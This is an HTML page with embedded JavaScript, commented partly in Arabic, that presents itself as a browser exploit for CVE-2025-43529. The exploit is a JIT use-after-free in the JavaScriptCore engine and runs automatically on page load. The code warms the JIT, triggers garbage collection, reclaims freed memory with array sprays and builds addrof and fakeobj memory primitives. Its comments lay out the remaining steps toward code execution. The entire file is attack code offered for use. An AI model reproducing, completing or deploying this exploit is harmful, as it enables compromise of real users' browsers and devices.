<body>
<script>
// ====== إعدادات أساسية ======
let A = { p0: 0x41414141 };
let freed_object = null;
let reclaimed_object = null;
let ref = [];

// ====== Helper Functions ======
function ftoi(f) {
    let buf = new ArrayBuffer(8);
    let fv = new Float64Array(buf);
    let iv = new BigUint64Array(buf);
    fv[0] = f;
    return iv[0];
}

function itof(i) {
    let buf = new ArrayBuffer(8);
    let fv = new Float64Array(buf);
    let iv = new BigUint64Array(buf);
    iv[0] = i;
    return fv[0];
}

// ====== JIT Function لتشغيل الـ UAF ======
function jitme(flag) {
    let a = { p0: 13.37 };
    let b = { p0: 0x42424242, p1: null };
    let f;
    
    if (flag) {
        f = b;
    } else {
        f = 1.1;
    }
    
    A.p0 = f;
    b.p0 = a;
    
    if (flag) freed_object = a;
}

// ====== تسخين JIT ======
for (let i = 0; i < 20000; i++) {
    jitme(true);
    jitme(false);
}

// ====== تشغيل Full GC لإطلاق السباق ======
function triggerGC() {
    let big = [];
    for (let i = 0; i < 100000; i++) {
        big.push({});
    }
}

// ====== عملية السباق (Race) ======
// أولاً: تخزين قيمة كبيرة في stack لعرقلة GC
function recursive(n) {
    if (n === 0) return;
    n = n | 0;
    recursive(n - 1);
}

// ====== استعادة الذاكرة ======
function reclaimButterfly() {
    for (let i = 0; i < 1e6; ++i) {
        let arr = [13.37, 2.2, 3.3, 4.4];
        ref.push(arr);
        if (freed_object && freed_object[0] === 13.37) {
            reclaimed_object = freed_object;
            return true;
        }
    }
    return false;
}

// ====== Primitive بناء ======
let boxed_arr, unboxed_arr;

function buildPrimitives() {
    boxed_arr = reclaimed_object;
    boxed_arr[0] = {}; // Double -> Contiguous
    unboxed_arr = freed_object;
}

function addrof(obj) {
    boxed_arr[0] = obj;
    return ftoi(unboxed_arr[0]);
}

function fakeobj(addr) {
    unboxed_arr[0] = itof(addr);
    return boxed_arr[0];
}

// ====== التنفيذ الرئيسي ======
async function exploit() {
    console.log("[*] Starting CVE-2025-43529 exploit...");
    
    // Trigger UAF
    jitme(true);
    
    // تشغيل GC
    triggerGC();
    
    // استدعاء recursive لمسح الـ stack
    recursive(10000);
    
    // استعادة الـ butterfly
    if (reclaimButterfly()) {
        console.log("[+] Butterfly reclaimed!");
        buildPrimitives();
        
        // اختبار الـ primitives
        let test_obj = { x: 0x1337 };
        let addr = addrof(test_obj);
        console.log("[+] addrof test_obj = 0x" + addr.toString(16));
        
        // الآن يمكن بناء read/write primitives
        console.log("[+] Exploit primitives ready!");
        console.log("[*] Next: Build read64/write64 → PAC bypass → RCE");
    } else {
        console.log("[-] Failed to reclaim butterfly, retrying...");
    }
}

// تشغيل الاستغلال عند تحميل الصفحة
window.onload = function() {
    exploit().catch(console.error);
};
